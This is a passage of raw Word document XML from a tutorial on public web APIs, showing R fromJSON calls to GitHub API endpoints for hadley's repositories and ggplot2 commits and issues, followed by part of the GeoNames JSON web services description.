          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>data,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> therefore not all output is printed in this document.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="300" w:after="150"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Github</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0" w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Github</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an online code repository and has APIs to get live data on almost all activity. Below some examples from a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>well known</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> R package and author:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267D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proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="identifier"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>hadley_orgs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="operator"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>&lt;-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="identifier"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>fromJSON</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="paren"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>"https://api.github.com/users/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>hadley</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>/orgs"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="paren"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267D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proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="identifier"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>hadley_repos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="operator"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>&lt;-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="identifier"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>fromJSON</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="paren"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>"https://api.github.com/users/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>hadley</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>/repos"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="paren"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267D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color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="identifier"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>gg_commits</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="operator"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>&lt;-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="identifier"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>fromJSON</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="paren"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>"https://api.github.com/repos/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>hadley</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>/ggplot2/commits"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="paren"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267D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rStyle w:val="identifier"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>gg_issues</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="operator"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>&lt;-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="identifier"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>fromJSON</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="paren"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>"https://api.github.com/repos/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>hadley</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="string"/>
          <w:color w:val="DD1144"/>
        </w:rPr>
        <w:t>/ggplot2/issues"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="paren"/>
          <w:color w:val="687687"/>
        </w:rPr>
        <w:t>)</w:t>
      </w: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Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">Paste the above </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> and test with Rest Console:</w:t>
      </w:r>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pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:ind w:left="300"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="336633"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="336633"/>
        </w:rPr>
        <w:t xml:space="preserve">JSON </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="336633"/>
        </w:rPr>
        <w:t>Webservices</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>GeoNames</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> offers most </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>webservices</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> in XML and JSON format. JSON has the advantage that is can be used to directly access the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>geonames</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>webservice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> code, whereas using XML the browser will throw a security exception if an xml call to another webserver is made.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">All JSON services accept an optional parameter 'callback' for a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> function call and a parameter 'formatted=true' to format the output with linefeeds and indentation. The latter is useful to view the JSON result in a browser but should not be used in production usage (waste of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>bandwith</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>JSON Examples :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId194" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
          </w:rPr>
          <w:t>Placename</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
          </w:rPr>
          <w:t xml:space="preserve"> autocomplete</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId195" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
          </w:rPr>
          <w:t xml:space="preserve">full text search on </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
          </w:rPr>
          <w:t>google</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
          </w:rPr>
          <w:t xml:space="preserve"> maps</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Places</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="997" w:name="citiesJSON"/>
      <w:bookmarkEnd w:id="997"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
        </w:rPr>
        <w:t xml:space="preserve">Cities and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3E5E7A"/>
        </w:rPr>
        <w:t>Placenames</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Webservice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Type :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> REST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
